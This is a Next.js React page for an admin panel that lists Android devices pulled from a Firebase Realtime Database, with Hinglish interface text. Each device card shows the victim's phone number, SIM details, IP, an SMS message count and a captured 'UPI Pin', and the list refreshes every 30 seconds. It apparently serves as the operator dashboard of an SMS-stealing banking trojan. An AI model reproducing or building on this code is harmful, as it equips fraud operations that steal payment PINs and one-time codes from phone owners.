'use client';

import { useEffect, useState, useCallback, useRef } from 'react';
import {
  Search, RefreshCw, Wifi, WifiOff, Loader2,
  ChevronLeft, ChevronRight, ToggleLeft, ToggleRight,
  Smartphone, AlertCircle, MessageSquare, Radio,
} from 'lucide-react';
import { useRouter } from 'next/navigation';

interface RtdbDevice {
  id: string;
  displayName: string;
  online: boolean;
  statusText: string;
  model: string;
  android: string;
  battery?: number;
  phone: string;
  sim1: string;
  sim2: string;
  network: string;
  ip: string;
  lastSeen?: number;
  upiPin: string;
  label: string;
  slot: string;
  messageCount: number;
  dateAdded: string;
  rtdbPath?: string;
}

function toStr(v: unknown): string { return v != null ? String(v).trim() : ''; }
function toNum(v: unknown): number | undefined {
  if (typeof v === 'number') return v;
  if (typeof v === 'string' && v !== '') { const n = Number(v); if (!isNaN(n)) return n; }
  return undefined;
}
function firstVal(obj: Record<string, unknown>, keys: string[]): unknown {
  for (const k of keys) if (obj[k] != null && obj[k] !== '') return obj[k];
  return undefined;
}

function countMessages(raw: Record<string, unknown>): number {
  for (const k of ['messages', 'Messages', 'sms', 'SMS', 'inbox', 'Inbox']) {
    const v = raw[k];
    if (v && typeof v === 'object' && !Array.isArray(v)) return Object.keys(v as object).length;
    if (Array.isArray(v)) return (v as unknown[]).length;
  }
  return 0;
}

function getSlot(raw: Record<string, unknown>): string {
  for (const k of ['slot', 'Slot', 'simSlot', 'simSlotIndex', 'subscriptionId']) {
    if (raw[k] != null) return String(raw[k]);
  }
  return '';
}

function flattenObj(raw: Record<string, unknown>): Record<string, unknown> {
  const out: Record<string, unknown> = { ...raw };
  const sims = raw['sims'] ?? raw['Sims'];
  if (Array.isArray(sims) && sims.length > 0) {
    const s0 = sims[0] as Record<string, unknown>;
    const phoneKeys = ['phoneNumber','PhoneNumber','number','Number','phone','Phone','mobile','Mobile','mobNo'];
    const opKeys = ['operator','Operator','provider','Provider','carrier','Carrier','network','Network'];
    for (const k of phoneKeys) if (s0?.[k] && !out['phoneNumber']) out['phoneNumber'] = s0[k];
    for (const k of opKeys) if (s0?.[k] && !out['operator']) out['operator'] = s0[k];
    if (!out['network'] && out['operator']) out['network'] = out['operator'];
  }
  return out;
}

function isOnline(raw: Record<string, unknown>): boolean {
  for (const k of ['online','Online','isOnline','connected','active'])
    if (raw[k] === true) return true;
  for (const k of ['online','Online','status','Status','connection','state']) {
    const v = String(raw[k] ?? '').toLowerCase();
    if (v === 'true' || v === '1' || v === 'online' || v === 'connected' || v === 'active') return true;
  }
  const tsKeys = ['lastSeen','LastSeen','updatedAt','lastActive','timestamp'];
  for (const k of tsKeys) {
    const ts = raw[k];
    if (typeof ts === 'number' && ts > 0) {
      const ms = ts > 9999999999 ? ts : ts * 1000;
      if (Date.now() - ms < 5 * 60 * 1000) return true;
    }
  }
  return false;
}

function getStatusText(raw: Record<string, unknown>): string {
  for (const k of ['status','Status','deviceStatus','connectionStatus']) {
    const v = String(raw[k] ?? '').trim();
    if (v && v !== 'null' && v !== 'undefined') return v;
  }
  return '';
}

function parseDevice(devId: string, rawOrig: Record<string, unknown>, path?: string): RtdbDevice {
  const raw = flattenObj(rawOrig);
  const online = isOnline(raw) || isOnline(rawOrig);
  const statusText = getStatusText(rawOrig) || getStatusText(raw);
  const brand = toStr(firstVal(raw, ['Brand','brand']));
  const modelOnly = toStr(firstVal(raw, ['modelName','ModelName','model','Model','device','Device']));
  const model = brand && modelOnly && !modelOnly.toLowerCase().startsWith(brand.toLowerCase())
    ? `${brand} ${modelOnly}` : (modelOnly || brand || '');
  const android = toStr(firstVal(raw, ['version','Version','androidVersion','android','osVersion']));
  const battery = toNum(firstVal(raw, ['batteryPercent','battery','Battery','batteryLevel','level','bat']));
  const phone = toStr(firstVal(raw, ['mobNo','MobNo','phoneNumber','PhoneNumber','phone','Phone','number','mobile','mobileNumber']));
  const network = toStr(firstVal(raw, ['provider','Provider','network','Network','operator','Operator','carrier','simOperator']));
  const ip = toStr(firstVal(raw, ['ip','IP','ipAddress','IpAddress']));
  const lastSeen = toNum(firstVal(raw, ['lastSeen','LastSeen','updatedAt','timestamp','time','lastOnline']));
  const upiPin = toStr(firstVal(rawOrig, ['upiPin','UpiPin','upi_pin','UPI_PIN','upi','UPI','upiPIN']));
  const label = toStr(firstVal(rawOrig, ['label','Label','tag','Tag','name','deviceName','alias']));
  const slot = getSlot(rawOrig) || getSlot(raw);
  const messageCount = countMessages(rawOrig);
  const dateAdded = toStr(firstVal(rawOrig, ['date','Date','createdAt','registeredAt','firstSeen','addedAt']));
  const sim1Raw = rawOrig['sim1'] ?? rawOrig['Sim1'] ?? rawOrig['sim_1'];
  const sim2Raw = rawOrig['sim2'] ?? rawOrig['Sim2'] ?? rawOrig['sim_2'];
  const sim1 = typeof sim1Raw === 'string' ? sim1Raw : typeof sim1Raw === 'object' && sim1Raw ? JSON.stringify(sim1Raw) : '';
  const sim2 = typeof sim2Raw === 'string' ? sim2Raw : typeof sim2Raw === 'object' && sim2Raw ? JSON.stringify(sim2Raw) : '';
  const displayName = model || toStr(firstVal(raw, ['name','Name','deviceName'])) || devId.slice(0, 8);
  return {
    id: devId, displayName, online, statusText, model, android, battery, phone,
    sim1, sim2, network, ip, lastSeen, upiPin, label, slot, messageCount, dateAdded, rtdbPath: path
  };
}

function fmtTime(ts: number | undefined): string {
  if (!ts) return 'N/A';
  const d = new Date(ts > 9999999999 ? ts : ts * 1000);
  return d.toLocaleString('en-IN', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true });
}

function timeAgo(ts: number): string {
  const diff = Math.floor((Date.now() - (ts > 9999999999 ? ts : ts * 1000)) / 1000);
  if (diff < 60) return `${diff}s ago`;
  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
  if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
  return `${Math.floor(diff / 86400)}d ago`;
}

const PAGE_SIZE = 20;
function loadStr(key: string): string { try { return localStorage.getItem(key) ?? ''; } catch { return ''; } }

function StatusBadge({ online, statusText }: { online: boolean; statusText: string }) {
  const lower = statusText.toLowerCase();
  const isUninstalled = lower.includes('uninstall') || lower.includes('removed');
  if (isUninstalled) {
    return <span className="text-xs font-bold text-orange-400">Uninstalled</span>;
  }
  return online
    ? <span className="flex items-center gap-1 text-xs font-bold text-emerald-400"><span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />Online</span>
    : <span className="flex items-center gap-1 text-xs font-bold text-red-400"><span className="w-2 h-2 rounded-full bg-red-500" />Offline</span>;
}

function DeviceCard({ d, num, onClick }: { d: RtdbDevice; num: number; onClick: () => void }) {
  return (
    <div
      onClick={onClick}
      className={`relative bg-slate-900 rounded-xl border cursor-pointer hover:border-slate-500 transition-all group ${
        d.online ? 'border-emerald-800/50' : 'border-slate-700/60'
      }`}
    >
      {d.online && <div className="absolute top-0 left-0 right-0 h-0.5 bg-gradient-to-r from-emerald-500 to-teal-500 rounded-t-xl" />}

      <div className="p-3 flex gap-3">
        <div className="flex flex-col items-center gap-1 flex-shrink-0">
          <span className="text-xs text-slate-500 font-mono">#{num}</span>
          <div className={`w-10 h-10 rounded-full flex items-center justify-center ${
            d.online ? 'bg-emerald-900/50 border border-emerald-700/50' : 'bg-slate-800 border border-slate-700'
          }`}>
            <Smartphone className={`w-5 h-5 ${d.online ? 'text-emerald-400' : 'text-slate-500'}`} />
          </div>
        </div>

        <div className="flex-1 min-w-0 space-y-1">
          <p className="text-sm font-bold text-white truncate">
            {d.phone || 'Permission denied'}
          </p>

          <div className="bg-slate-800/60 rounded-lg px-2 py-1">
            <p className="text-[10px] text-slate-400 font-medium">UPI Pin</p>
            <p className="text-xs font-bold text-slate-200">{d.upiPin || 'N/A'}</p>
          </div>

          <p className="text-[10px] text-slate-400 font-mono">
            ID: {d.id.slice(0, 8)}
            {d.slot ? ` [slot${d.slot}]` : ''}
          </p>

          <p className="text-[10px] text-slate-400">Label: {d.label || 'N/A'}</p>

          {d.dateAdded && (
            <p className="text-[10px] text-slate-500">
              {d.dateAdded.replace('|', '·')}
            </p>
          )}
          {d.lastSeen && (
            <p className="text-[10px] text-slate-500">
              Last: {fmtTime(d.lastSeen)} · {timeAgo(d.lastSeen)}
            </p>
          )}
        </div>

        <div className="flex flex-col items-end gap-2 flex-shrink-0">
          <StatusBadge online={d.online} statusText={d.statusText} />
          {d.messageCount > 0 && (
            <span className="flex items-center gap-1 text-[10px] text-blue-400 font-medium">
              <MessageSquare className="w-3 h-3" /> {d.messageCount}
            </span>
          )}
          <Radio className={`w-4 h-4 ${d.online ? 'text-emerald-400' : 'text-slate-600'}`} />
        </div>
      </div>

      {(d.sim1 || d.sim2) && (
        <div className="border-t border-slate-700/40 px-3 py-1.5 flex gap-3">
          {d.sim1 && <span className="text-[10px] text-slate-400 truncate max-w-[45%]"><span className="text-slate-500">SIM1:</span> {d.sim1}</span>}
          {d.sim2 && <span className="text-[10px] text-slate-400 truncate max-w-[45%]"><span className="text-slate-500">SIM2:</span> {d.sim2}</span>}
        </div>
      )}
    </div>
  );
}

export default function DevicesPage() {
  const router = useRouter();
  const [devices, setDevices] = useState<RtdbDevice[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [search, setSearch] = useState('');
  const [filter, setFilter] = useState<'all' | 'online' | 'offline'>('all');
  const [slotFilter, setSlotFilter] = useState<string>('all');
  const [autoUpdate, setAutoUpdate] = useState(true);
  const [page, setPage] = useState(1);
  const [lastUpdated, setLastUpdated] = useState<Date | null>(null);
  const [credReady, setCredReady] = useState(false);
  const [rootKeys, setRootKeys] = useState<string[]>([]);
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    async function initCreds() {
      const url = loadStr('panel_rtdb_url');
      const sa = loadStr('panel_service_account');
      if (url && sa) { setCredReady(true); return; }

      try {
        const res = await fetch('/api/auto-config');
        const json = await res.json() as {
          configured: boolean;
          rtdbUrl?: string;
          serviceAccountJson?: string | null;
          projectId?: string;
        };
        if (json.configured && json.rtdbUrl) {
          try { localStorage.setItem('panel_rtdb_url', json.rtdbUrl.replace(/\/$/, '')); } catch { /**/ }
        }
        if (json.configured && json.serviceAccountJson) {
          try { localStorage.setItem('panel_service_account', json.serviceAccountJson); } catch { /**/ }
        }
      } catch { /**/ }
      setCredReady(true);
    }
    void initCreds();
  }, []);

  const fetchDevices = useCallback(async () => {
    const url = loadStr('panel_rtdb_url');
    const saRaw = loadStr('panel_service_account');
    if (!url) return;
    setLoading(true);
    setError('');
    try {
      let parsed: RtdbDevice[] = [];

      if (saRaw) {
        const res = await fetch('/api/admin-devices', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            serviceAccount: JSON.parse(saRaw),
            rtdbUrl: url,
            multiPath: true,
          }),
          signal: AbortSignal.timeout(25000),
        });
        const json = await res.json() as {
          data?: Record<string, { path: string; data: unknown }>;
          rootKeys?: string[];
          activePaths?: string[];
          error?: string;
        };

        if (json.error) { setError(json.error); return; }
        if (json.rootKeys) setRootKeys(json.rootKeys);

        if (json.data && Object.keys(json.data).length > 0) {
          parsed = Object.entries(json.data)
            .filter(([, v]) => v?.data && typeof v.data === 'object' && !Array.isArray(v.data))
            .map(([id, { path, data }]) => parseDevice(id, data as Record<string, unknown>, path))
            .sort((a, b) => (b.lastSeen ?? 0) - (a.lastSeen ?? 0));
        }
      }

      setDevices(parsed);
      setLastUpdated(new Date());
    } catch (e) {
      setError(e instanceof Error ? e.message : 'Fetch failed');
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => { if (credReady) { void fetchDevices(); } }, [fetchDevices, credReady]);

  useEffect(() => {
    if (timerRef.current) clearInterval(timerRef.current);
    if (autoUpdate && credReady) {
      timerRef.current = setInterval(() => { void fetchDevices(); }, 30_000);
    }
    return () => { if (timerRef.current) clearInterval(timerRef.current); };
  }, [autoUpdate, fetchDevices, credReady]);

  const slots = Array.from(new Set(devices.map(d => d.slot).filter(Boolean))).sort();
  const slotCounts: Record<string, number> = {};
  for (const d of devices) if (d.slot) slotCounts[d.slot] = (slotCounts[d.slot] ?? 0) + 1;

  const filtered = devices.filter(d => {
    const q = search.toLowerCase();
    const matchSearch = !q || d.displayName.toLowerCase().includes(q) ||
      d.phone.includes(q) || d.model.toLowerCase().includes(q) ||
      d.id.toLowerCase().includes(q) || d.upiPin.includes(q) ||
      d.label.toLowerCase().includes(q) || d.sim1.includes(q) || d.sim2.includes(q);
    const matchFilter = filter === 'all' || (filter === 'online' ? d.online : !d.online);
    const matchSlot = slotFilter === 'all' || d.slot === slotFilter;
    return matchSearch && matchFilter && matchSlot;
  });

  const totalPages = Math.max(1, Math.ceil(filtered.length / PAGE_SIZE));
  const curPage = Math.min(page, totalPages);
  const pageItems = filtered.slice((curPage - 1) * PAGE_SIZE, curPage * PAGE_SIZE);
  const onlineCount = devices.filter(d => d.online).length;
  const noCredentials = !loadStr('panel_rtdb_url');

  return (
    <div className="space-y-3 animate-fade-in p-4">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-xl font-bold text-white">Devices</h1>
          <p className="text-xs text-slate-400">
            Total {devices.length} :: Sort By - All
            {lastUpdated && <span className="ml-2 text-slate-500">· {lastUpdated.toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', hour12: true })}</span>}
          </p>
        </div>
        <div className="flex items-center gap-2">
          <button
            onClick={() => setAutoUpdate(v => !v)}
            className={`flex items-center gap-1 px-2 py-1 rounded text-xs border transition-colors ${
              autoUpdate ? 'bg-emerald-900/30 border-emerald-700/50 text-emerald-400' : 'bg-slate-800 border-slate-700 text-slate-400'
            }`}
          >
            {autoUpdate ? <ToggleRight className="w-3.5 h-3.5" /> : <ToggleLeft className="w-3.5 h-3.5" />}
            Live
          </button>
          <button onClick={() => { void fetchDevices(); }} disabled={loading} className="p-1.5 rounded bg-slate-800 border border-slate-700 text-slate-400 hover:text-white transition-colors">
            {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : <RefreshCw className="w-4 h-4" />}
          </button>
        </div>
      </div>

      <div className="grid grid-cols-4 gap-2">
        {[
          { label: 'Total', val: devices.length, color: 'text-emerald-400' },
          { label: 'Online', val: onlineCount, color: 'text-blue-400' },
          { label: 'Offline', val: devices.length - onlineCount, color: 'text-red-400' },
          { label: 'This Page', val: pageItems.length, color: 'text-violet-400' },
        ].map(({ label, val, color }) => (
          <div key={label} className="bg-slate-900 border border-slate-700/50 rounded-lg px-3 py-2 text-center">
            <p className={`text-xl font-extrabold ${color}`}>{val}</p>
            <p className="text-[10px] text-slate-500 font-medium">{label}</p>
          </div>
        ))}
      </div>

      {error && (
        <div className="bg-red-950/40 border border-red-800/60 rounded-lg px-3 py-2 text-xs text-red-400 flex items-start gap-2">
          <AlertCircle className="w-3.5 h-3.5 flex-shrink-0 mt-0.5" />
          <span>{error}</span>
        </div>
      )}

      {rootKeys.length > 0 && devices.length === 0 && (
        <div className="bg-blue-950/30 border border-blue-800/40 rounded-lg px-3 py-2 text-xs text-blue-300">
          RTDB root keys: <span className="font-mono">{rootKeys.join(', ')}</span>
          <span className="text-blue-400 ml-2">— Settings mein correct path check karo</span>
        </div>
      )}

      {noCredentials && !loading && (
        <div className="bg-amber-950/30 border border-amber-800/40 rounded-lg px-3 py-3 text-sm text-amber-300 text-center space-y-1">
          <p className="font-semibold">Firebase credentials configure nahi hain</p>
          <p className="text-xs text-amber-400">Settings mein google-services.json aur Admin SDK JSON upload karo</p>
          <a href="/settings" className="inline-block mt-1 px-3 py-1 bg-amber-700 text-white rounded text-xs font-medium hover:bg-amber-600">Go to Settings</a>
        </div>
      )}

      {slots.length > 0 && (
        <div className="flex gap-1.5 flex-wrap">
          <button
            onClick={() => setSlotFilter('all')}
            className={`px-3 py-1 rounded-full text-xs font-medium border transition-all ${
              slotFilter === 'all' ? 'bg-teal-700 border-teal-600 text-white' : 'bg-slate-800 border-slate-700 text-slate-400 hover:text-white'
            }`}
          >
            All · {devices.length}
          </button>
          {slots.map(s => (
            <button
              key={s}
              onClick={() => setSlotFilter(s)}
              className={`px-3 py-1 rounded-full text-xs font-medium border transition-all ${
                slotFilter === s ? 'bg-teal-700 border-teal-600 text-white' : 'bg-slate-800 border-slate-700 text-slate-400 hover:text-white'
              }`}
            >
              slot{s} · {slotCounts[s] ?? 0}
            </button>
          ))}
        </div>
      )}

      <div className="flex gap-2">
        <div className="relative flex-1">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-slate-500" />
          <input
            type="search"
            placeholder="Search SMS…"
            value={search}
            onChange={e => { setSearch(e.target.value); setPage(1); }}
            className="w-full pl-9 pr-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-sm text-slate-200 placeholder-slate-500 outline-none focus:border-teal-600"
          />
        </div>
        <div className="flex border border-slate-700 rounded-lg overflow-hidden">
          {(['all', 'online', 'offline'] as const).map(f => (
            <button
              key={f}
              onClick={() => { setFilter(f); setPage(1); }}
              className={`px-3 py-1 text-xs font-semibold capitalize transition-colors ${
                filter === f
                  ? f === 'online' ? 'bg-emerald-700 text-white'
                    : f === 'offline' ? 'bg-red-700 text-white'
                    : 'bg-slate-700 text-white'
                  : 'bg-slate-800/60 text-slate-400 hover:text-slate-200'
              }`}
            >
              {f}
            </button>
          ))}
        </div>
      </div>

      {loading && devices.length === 0 ? (
        <div className="text-center py-16">
          <Loader2 className="w-8 h-8 animate-spin text-teal-400 mx-auto mb-3" />
          <p className="text-sm text-slate-400">Firebase se data fetch ho raha hai…</p>
        </div>
      ) : filtered.length > 0 ? (
        <>
          <div className="grid grid-cols-1 gap-2">
            {pageItems.map((d, i) => (
              <DeviceCard
                key={d.id}
                d={d}
                num={filtered.length - ((curPage - 1) * PAGE_SIZE + i)}
                onClick={() => router.push(`/devices/${d.id}`)}
              />
            ))}
          </div>

          <div className="flex items-center justify-between pt-1">
            <p className="text-xs text-slate-500">
              {(curPage - 1) * PAGE_SIZE + 1}–{Math.min(filtered.length, curPage * PAGE_SIZE)} of {filtered.length}
            </p>
            <div className="flex items-center gap-1">
              <button onClick={() => setPage(p => Math.max(1, p - 1))} disabled={curPage === 1}
                className="p-1.5 rounded bg-slate-800 border border-slate-700 disabled:opacity-30 text-slate-400 hover:text-white transition-colors">
                <ChevronLeft className="w-4 h-4" />
              </button>
              <span className="px-2 py-1 text-xs text-slate-400">{curPage}/{totalPages}</span>
              <button onClick={() => setPage(p => Math.min(totalPages, p + 1))} disabled={curPage === totalPages}
                className="p-1.5 rounded bg-slate-800 border border-slate-700 disabled:opacity-30 text-slate-400 hover:text-white transition-colors">
                <ChevronRight className="w-4 h-4" />
              </button>
            </div>
          </div>
        </>
      ) : !loading && (
        <div className="text-center py-16 space-y-2">
          <WifiOff className="w-10 h-10 text-slate-600 mx-auto" />
          <p className="text-slate-400 font-medium">
            {noCredentials ? 'Firebase configure karo' : 'Koi device nahi mila'}
          </p>
          {!noCredentials && !error && (
            <p className="text-xs text-slate-600">
              Multi-path scan kiya — device app se connect karo ya Settings check karo
            </p>
          )}
        </div>
      )}

      {devices.length > 0 && (
        <div className="flex gap-4 text-xs text-slate-500 pt-1">
          <span className="flex items-center gap-1"><Wifi className="w-3 h-3 text-emerald-400" />{onlineCount} online</span>
          <span className="flex items-center gap-1"><WifiOff className="w-3 h-3 text-red-400" />{devices.length - onlineCount} offline</span>
        </div>
      )}
    </div>
  );
}
